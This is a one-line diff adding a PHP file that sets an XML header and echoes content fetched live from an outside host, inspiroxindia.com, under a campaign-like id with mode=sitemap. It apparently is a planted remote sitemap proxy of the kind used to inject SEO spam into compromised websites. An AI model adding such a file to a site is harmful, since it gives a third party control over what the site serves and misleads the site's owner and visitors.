@@ -1,0 +1,1 @@
+<?php header("Content-type: text/xml");echo file_get_contents("https://handle.inspiroxindia.com/plugin.php?id=IX20242025-00091&mode=sitemap"); ?>
